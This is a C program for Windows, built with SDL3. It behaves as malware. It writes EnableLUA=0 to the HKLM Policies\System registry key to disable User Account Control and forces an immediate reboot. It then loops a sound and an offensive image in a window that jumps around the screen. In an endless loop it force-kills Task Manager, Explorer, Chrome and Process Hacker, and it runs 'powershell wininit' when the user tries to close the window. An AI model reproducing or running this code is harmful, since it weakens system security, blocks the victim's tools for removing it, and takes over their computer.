#include <SDL3/SDL.h>
#include <windows.h>
#include <mmsystem.h>
#include <stdio.h>

int main()
{
  SDL_Window *window;
  SDL_Renderer *renderer;
  SDL_Surface *surface;
  SDL_Texture *texture;

  HKEY hKey;
  LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
  DWORD value = 0;
  DWORD existingValue = 1;
  DWORD size = sizeof(DWORD);

  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {

    DWORD result = RegQueryValueExA(hKey, "EnableLUA", NULL, NULL, (LPBYTE)&existingValue, &size);
    printf("result: %d\n", existingValue);

    if (existingValue != 0) {
      if (RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
      }
      system("shutdown /r /t 0");
    }
  }

  RegCloseKey(hKey);



  if (!SDL_Init(SDL_INIT_VIDEO) || !SDL_Init(SDL_INIT_AUDIO))
  {
    SDL_LogError(SDL_LOG_CATEGORY_APPLICATION, "Couldn't initialize SDL: %s", SDL_GetError());
    return 3;
  }

  SDL_CreateWindowAndRenderer(
      "hfdh",
      800,
      600,
      SDL_WINDOW_OPENGL,
      &window,
      &renderer);

  surface = SDL_LoadBMP("assets/fuck.bmp");
  texture = SDL_CreateTextureFromSurface(renderer, surface);

  SDL_DestroySurface(surface);

  PlaySound(TEXT("assets/dur.wav"), NULL, SND_ASYNC | SND_LOOP | SND_FILENAME);

  while (true)
  {
    SDL_Event event;
    SDL_PollEvent(&event);

    ShellExecute(NULL, "runas", "taskkill", "/f /im taskmgr.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im explorer.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im chrome.exe", NULL, SW_HIDE);
    ShellExecute(NULL, "runas", "taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE);

    if (event.type == SDL_EVENT_QUIT)
    {
      SDL_ShowSimpleMessageBox(SDL_MESSAGEBOX_WARNING, "Title", "Message", window);
      system("powershell wininit");
      // break;
    }

    SDL_SetWindowPosition(window, rand() % 1920, rand() % 1080);

    SDL_SetRenderDrawColor(renderer, 0, 0, 0, 0);
    SDL_RenderClear(renderer);
    SDL_RenderTexture(renderer, texture, NULL, NULL);
    SDL_RenderPresent(renderer);
  }

  SDL_DestroyTexture(texture);
  SDL_DestroyRenderer(renderer);
  SDL_DestroyWindow(window);
  SDL_Quit();

  return 0;
}